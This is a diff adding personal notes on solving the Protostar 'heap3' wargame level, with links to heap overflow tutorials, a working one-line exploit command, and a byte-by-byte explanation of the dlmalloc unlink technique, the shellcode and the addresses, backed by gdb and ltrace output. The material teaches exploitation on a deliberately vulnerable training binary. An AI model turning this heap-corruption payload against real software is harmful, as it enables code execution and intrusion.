@@ -1,0 +1,94 @@
+Great tutorials on heap overflow
+-----
+1. http://www.thehackerslibrary.com/?p=872
+
+2. http://www.phrack.org/archives/57/p57_0x08_Vudo%20malloc%20tricks_by_MaXX.txt
+! Section 3.6 - Execution of arbitrary code
+
+3. http://www.cgsecurity.org/exploit/heaptut.txt
+
+Solution
+---------
+From: http://thisisdearmo.blogspot.ro/2012/06/protostar-heap-3-solution.html
+$ ./heap3 $(python -c 'print "A" * 32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "A"*4 + "\x50\xf7\xff\xbf" + "\x60\xc0\x04\x08"') $(python -c 'print "\x90" * 8 + "\xeb\x0f" + "A"*14 + "\x90" * 2 + "\x68\x76\xdc\xea\xb7\x68\x64\x88\x04\x08\xc3"')
+that wasn't too bad now, was it? @ 1349546894
+
+
+
+What happens??
+-----------------
+Hard to digest at first, but [2] has the explanation:
+
+Layout of a, b, c variables in heap after allocation:
+
+------------  a  ----------------------
+|  prev_size (4 bytes)                |
+---------------------------------------
+|   size    (4 bytes)                 |
+---------------------------------------
+|  data (32 bytes)                    |
+---------------------------------------
+------------  b  ----------------------
+|  prev_size (4 bytes)                |
+---------------------------------------
+|   size    (4 bytes)                 |
+---------------------------------------
+|  data (32 bytes)                    |
+---------------------------------------
+------------  c  ----------------------
+|  prev_size (4 bytes)                |
+---------------------------------------
+|   size    (4 bytes)                 |
+---------------------------------------
+|  data (32 bytes)                    |
+---------------------------------------
+
+a : "A" * 32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"
+"\xfc\xff\xff\xff" - prev_size field of the second chunk
+"\xfc\xff\xff\xff" - size field of the second chunk (last bit (PREV_INUSE) set,
+                     to trick dlmalloc think that first chunk is free.
+                     Set to -4 as explained below.
+From Maxx's article:
+"For instance, if the attacker overwrites the size field of the second
+chunk with -4 (0xfffffffc), dlmalloc will think the beginning of the
+next contiguous chunk is in fact 4 bytes before the beginning of the
+second chunk, and will therefore read the prev_size field of the second
+chunk instead of the size field of the next contiguous chunk. So if
+the attacker stores an even integer (an integer whose PREV_INUSE bit
+is clear) in this prev_size field, dlmalloc will process the corrupted
+second chunk with unlink() and the attacker will be able to apply the
+technique described in 3.6.1.1"
+
+b : "A"*4 + "\x50\xf7\xff\xbf" + "\x60\xc0\x04\x08"
+"A"*4 - size of the fake b chunk
+"\x50\xf7\xff\xbf" - the address of the location to overwrite -12.
+  Can be address of func() in got or smth. 
+  In this case, a location on the stack which contains a ret.
+                     
+"\x60\xc0\x04\x08" - the address to overwrite with (location of c,
+                     plus 8. The shellcode will be placed there.
+
+c : "\x90" * 8 + "\xeb\x0f" + "A"*14 + "\x90" * 2 + "\x68\x76\xdc\xea\xb7\x68\x64\x88\x04\x08\xc3"
+"\x90" * 8 - padding ??
+"\xeb\x0f" - jmp +15
+"\x90" * 2 - more NOPs
+"\x68\x76\xdc\xea\xb7" - push 0xb7eadc76 (old address we've overwritten. To get
+back an exit cleanly). 
+(gdb) x /x 0xbffff75c
+0xbffff75c:	0xb7eadc76
+
+"\x68\x64\x88\x04\x08" - push 0x08048864, this is the location of winner()
+"\xc3" - retn
+
+
+----------
+Get the addresses where a, b, c are allocated
+$ ltrace ./heap3 aa bb cc
+__libc_start_main(0x8048889, 4, 0xbffff884, 0x804ab50, 0x804ab40 <unfinished ...>
+sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffff74c)                               = 4096
+sbrk(4096)                                                                       = 0x0804c000
+sbrk(0)                                                                          = 0x0804d000
+strcpy(0x0804c008, "aa")                                                         = 0x0804c008
+strcpy(0x0804c030, "bb")                                                         = 0x0804c030
+strcpy(0x0804c058, "cc")                                                         = 0x0804c058
+
